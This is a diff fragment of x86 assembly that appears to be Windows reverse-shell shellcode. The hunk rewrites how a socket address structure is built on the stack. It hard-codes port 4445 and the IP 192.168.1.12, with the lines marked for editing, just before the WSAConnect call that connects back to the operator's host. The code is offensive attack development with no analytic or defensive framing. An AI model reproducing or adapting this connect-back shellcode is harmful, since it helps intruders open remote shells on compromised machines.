@@ -284,13 +284,16 @@ _start:
 	; socket Handle
 	mov DWORD[esp+0x1C],eax	; SOCKET 
 	
+	; ===========================
 	; SOCKADDR_IN
+	; ============================
 	xor ecx, ecx
-	inc ecx
-	inc ecx
-	mov WORD[ sss + SOCKADDR_IN.sin_family ],cx		; AF_INET
-	mov WORD[ sss + SOCKADDR_IN.sin_port ],  0x5D11		; port 4445
-	mov DWORD[ sss + SOCKADDR_IN.sin_addr ], 0x0c01a8c0 	; IP   192.168.1.12
+	mov dword[esp+0x08],ecx
+	mov cx, 0x5d11			; <--- PORT
+	rol ecx,0x10
+	or  ecx,0x02
+	mov dword[esp],ecx
+	mov dword[esp+0x4], 0x0c01a8c0 	; <--- IP
 
 	_WSAConnect:
 	xor eax,eax
